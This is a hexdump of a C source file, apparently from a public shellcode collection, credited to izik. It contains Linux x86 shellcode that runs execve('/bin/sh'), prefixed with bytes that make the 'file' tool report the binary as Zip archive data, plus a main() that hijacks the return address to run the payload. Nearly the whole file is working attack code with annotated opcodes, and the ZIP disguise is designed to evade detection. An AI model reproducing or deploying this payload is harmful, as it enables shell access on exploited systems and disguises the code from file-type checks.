00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 2d 20 65 78 65  63 76 65 28 22 2f 62 69  |6) - execve("/bi|
00000020  6e 2f 73 68 22 2c 20 5b  22 2f 62 69 6e 2f 73 68  |n/sh", ["/bin/sh|
00000030  22 2c 20 4e 55 4c 4c 5d  29 20 2b 20 5a 49 50 20  |", NULL]) + ZIP |
00000040  48 65 61 64 65 72 20 2d  20 32 38 20 62 79 74 65  |Header - 28 byte|
00000050  73 0d 0a 20 2a 0d 0a 20  2a 20 72 6f 6f 74 40 6d  |s.. *.. * root@m|
00000060  61 67 69 63 62 6f 78 3a  7e 23 20 66 69 6c 65 20  |agicbox:~# file |
00000070  6c 69 6e 75 78 2d 73 68  2d 7a 69 70 68 64 72 2e  |linux-sh-ziphdr.|
00000080  62 69 6e 0d 0a 20 2a 20  6c 69 6e 75 78 2d 73 68  |bin.. * linux-sh|
00000090  2d 7a 69 70 68 64 72 2e  62 69 6e 3a 20 5a 69 70  |-ziphdr.bin: Zip|
000000a0  20 61 72 63 68 69 76 65  20 64 61 74 61 0d 0a 20  | archive data.. |
000000b0  2a 0d 0a 20 2a 20 2d 20  69 7a 69 6b 20 3c 69 7a  |*.. * - izik <iz|
000000c0  69 6b 40 74 74 79 36 34  2e 6f 72 67 3e 0d 0a 20  |ik@tty64.org>.. |
000000d0  2a 2f 0d 0a 0d 0a 63 68  61 72 20 73 68 65 6c 6c  |*/....char shell|
000000e0  63 6f 64 65 5b 5d 20 3d  20 0d 0a 0d 0a 09 2f 2f  |code[] = .....//|
000000f0  0d 0a 09 2f 2f 20 5a 49  50 20 48 65 61 64 65 72  |...// ZIP Header|
00000100  20 28 35 20 62 79 74 65  73 29 0d 0a 09 2f 2f 0d  | (5 bytes)...//.|
00000110  0a 0d 0a 09 22 5c 78 35  30 22 20 20 20 20 20 20  |...."\x50"      |
00000120  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
00000130  75 73 68 20 25 65 61 78  20 0d 0a 09 22 5c 78 34  |ush %eax ..."\x4|
00000140  62 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b"              |
00000150  20 20 20 20 2f 2f 20 64  65 63 20 25 65 62 78 20  |    // dec %ebx |
00000160  0d 0a 09 22 5c 78 30 33  5c 78 30 34 5c 78 32 34  |..."\x03\x04\x24|
00000170  22 20 20 20 20 20 20 20  20 20 20 2f 2f 20 61 64  |"          // ad|
00000180  64 20 28 25 65 73 70 29  2c 25 65 61 78 20 0d 0a  |d (%esp),%eax ..|
00000190  0d 0a 09 2f 2f 0d 0a 09  2f 2f 20 65 78 65 63 76  |...//...// execv|
000001a0  65 28 22 2f 62 69 6e 2f  73 68 22 2c 20 5b 22 2f  |e("/bin/sh", ["/|
000001b0  62 69 6e 2f 73 68 22 2c  20 4e 55 4c 4c 5d 29 3b  |bin/sh", NULL]);|
000001c0  0d 0a 09 2f 2f 0d 0a 0d  0a 09 22 5c 78 36 61 5c  |...//....."\x6a\|
000001d0  78 30 62 22 20 20 20 20  20 20 20 20 20 20 20 20  |x0b"            |
000001e0  20 20 2f 2f 20 70 75 73  68 20 24 30 78 62 20 0d  |  // push $0xb .|
000001f0  0a 09 22 5c 78 35 38 22  20 20 20 20 20 20 20 20  |.."\x58"        |
00000200  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 6f 70  |          // pop|
00000210  20 25 65 61 78 20 0d 0a  09 22 5c 78 39 39 22 20  | %eax ..."\x99" |
00000220  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000230  20 2f 2f 20 63 6c 74 64  20 0d 0a 09 22 5c 78 35  | // cltd ..."\x5|
00000240  32 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2"              |
00000250  20 20 20 20 2f 2f 20 70  75 73 68 20 25 65 64 78  |    // push %edx|
00000260  20 0d 0a 09 22 5c 78 36  38 5c 78 32 66 5c 78 32  | ..."\x68\x2f\x2|
00000270  66 5c 78 37 33 5c 78 36  38 22 20 20 2f 2f 20 70  |f\x73\x68"  // p|
00000280  75 73 68 20 24 30 78 36  38 37 33 32 66 32 66 20  |ush $0x68732f2f |
00000290  0d 0a 09 22 5c 78 36 38  5c 78 32 66 5c 78 36 32  |..."\x68\x2f\x62|
000002a0  5c 78 36 39 5c 78 36 65  22 20 20 2f 2f 20 70 75  |\x69\x6e"  // pu|
000002b0  73 68 20 24 30 78 36 65  36 39 36 32 32 66 20 0d  |sh $0x6e69622f .|
000002c0  0a 09 22 5c 78 38 39 5c  78 65 33 22 20 20 20 20  |.."\x89\xe3"    |
000002d0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
000002e0  20 25 65 73 70 2c 25 65  62 78 20 0d 0a 09 22 5c  | %esp,%ebx ..."\|
000002f0  78 35 32 22 20 20 20 20  20 20 20 20 20 20 20 20  |x52"            |
00000300  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 25 65  |      // push %e|
00000310  64 78 20 0d 0a 09 22 5c  78 35 33 22 20 20 20 20  |dx ..."\x53"    |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000330  20 70 75 73 68 20 25 65  62 78 20 0d 0a 09 22 5c  | push %ebx ..."\|
00000340  78 38 39 5c 78 65 31 22  20 20 20 20 20 20 20 20  |x89\xe1"        |
00000350  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 25 65 73  |      // mov %es|
00000360  70 2c 25 65 63 78 20 0d  0a 09 22 5c 78 63 64 5c  |p,%ecx ..."\xcd\|
00000370  78 38 30 22 3b 20 20 20  20 20 20 20 20 20 20 20  |x80";           |
00000380  20 20 2f 2f 20 69 6e 74  20 24 30 78 38 30 20 0d  |  // int $0x80 .|
00000390  0a 0d 0a 69 6e 74 20 6d  61 69 6e 28 69 6e 74 20  |...int main(int |
000003a0  61 72 67 63 2c 20 63 68  61 72 20 2a 2a 61 72 67  |argc, char **arg|
000003b0  76 29 20 7b 0d 0a 09 69  6e 74 20 2a 72 65 74 3b  |v) {...int *ret;|
000003c0  0d 0a 09 72 65 74 20 3d  20 28 69 6e 74 20 2a 29  |...ret = (int *)|
000003d0  26 72 65 74 20 2b 20 32  3b 0d 0a 09 28 2a 72 65  |&ret + 2;...(*re|
000003e0  74 29 20 3d 20 28 69 6e  74 29 20 73 68 65 6c 6c  |t) = (int) shell|
000003f0  63 6f 64 65 3b 0d 0a 7d                           |code;..}|
000003f8
